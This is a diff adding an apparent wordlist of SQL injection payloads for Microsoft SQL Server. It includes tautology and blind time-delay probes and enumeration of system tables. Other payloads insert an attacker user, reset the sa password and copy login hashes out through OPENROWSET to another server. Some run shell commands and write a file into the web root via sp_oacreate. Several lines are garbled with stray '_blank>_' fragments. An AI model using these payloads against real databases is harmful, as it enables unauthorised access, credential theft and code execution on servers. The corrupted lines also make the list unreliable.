@@ -1,0 +1,53 @@
+; and 1=1 and 1=22.admin adminuser user pass password ..
+and 0<>(select count(*) from *)
+group by users.id having 1=1--
+group by users.id, users.username, users.password, users.privs having 1=1--
+; insert into users values( 666, attacker, foobar, 0xffff )--
+UNION Select TOP 1 COLUMN_blank>_NAME FROM INFORMATION_blank>_SCHEMA.COLUMNS Where TABLE_blank>_NAME=logintable-
+and user_blank>_name()=dbo--
+and 0<>(select top 1 name from bbs.dbo.sysobjects where xtype=U)
+;exec master.dbo.sp_blank>_password null,jiaoniang$,1866574;--
+:a or name like fff%;-- ffff。
+and 1<>(select count(email) from [user]);--
+;update [users] set email=(select top 1 name from sysobjects where xtype=u and status>0) where name=ffff;--
+id=152 and exists(select * from aaa where aaa>5)
+insert into OPENROWSET(SQLOLEDB, server=servername;uid=sa;pwd=123, select * from table1) select * from table2
+table2_blank>table1。IP
+insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table2) select * from database..table2
+HASH_blank>hashsysxlogins。
+insert into OPENROWSET(SQLOLEDB, uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _blank>_sysxlogins) 
+1and 1=(Select IS_blank>_SRVROLEMEMBER(sysadmin));--
+;insert dirs exec master.dbo.xp_blank>_dirtree c:\--
+and 0<>(select top 1 paths from dirs)--
+and 0<>(select top 1 paths from dirs where paths not in(@Inetpub))--
+;create table dirs1(paths varchar(100), id int)--
+;insert dirs exec master.dbo.xp_blank>_dirtree e:\web--
+and 0<>(select top 1 paths from dirs1)--
+and 1=(Select top 1 name from(Select top 12 id,name from sysobjects where xtype=char(85)) T order by id desc)
+and 1=(Select Top 1 col_blank>_name(object_blank>_id(USER_blank>_LOGIN),1) from sysobjects) 。
+and 1=(select user_blank>_id from USER_blank>_LOGIN)
+and 0=(select user from USER_blank>_LOGIN where user>1)
+exec sp_blank>_oacreate wscript.shell, @o out
+exec sp_blank>_oamethod @o, run, NULL, notepad.exe
+; declare @o int exec sp_blank>_oacreate wscript.shell, @o out exec sp_blank>_oamethod @o, run, NULL, notepad.exe--
+declare @o int, @f int, @t int, @ret int
+declare @line varchar(8000)
+exec sp_blank>_oacreate scripting.filesystemobject, @o out
+exec sp_blank>_oamethod @o, opentextfile, @f out, c:\boot.ini, 1
+exec @ret = sp_blank>_oamethod @f, readline, @line out
+exec sp_blank>_oacreate scripting.filesystemobject, @o out
+exec sp_blank>_oamethod @o, createtextfile, @f out, c:\inetpub\wwwroot\foo.asp, 1
+exec @ret = sp_blank>_oamethod @f, writeline, NULL,
+exec sp_blank>_oacreate speech.voicetext, @o out
+exec sp_blank>_oamethod @o, register, NULL, foo, bar
+exec sp_blank>_oasetproperty @o, speed, 150
+exec sp_blank>_oamethod @o, speak, NULL, all your sequel servers are belong to,us, 528waitfor delay 00:00:05
+; declare @o int, @ret int exec sp_blank>_oacreate speech.voicetext, @o out exec sp_blank>_oamethod @o, register, NULL, foo, bar exec sp_blank>_oasetproperty @o, speed, 150 exec sp_blank>_oamethod @o, speak, NULL, all your sequel servers are belong to us, 528 waitfor delay 00:00:05--
+1+and+1=1
+');waitFor+Delay+'00:00:05'
+') or '1'='1--
+OR 1=1
+WHERE 1=1 AND 1=1
+ORDER BY 1--
+RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+
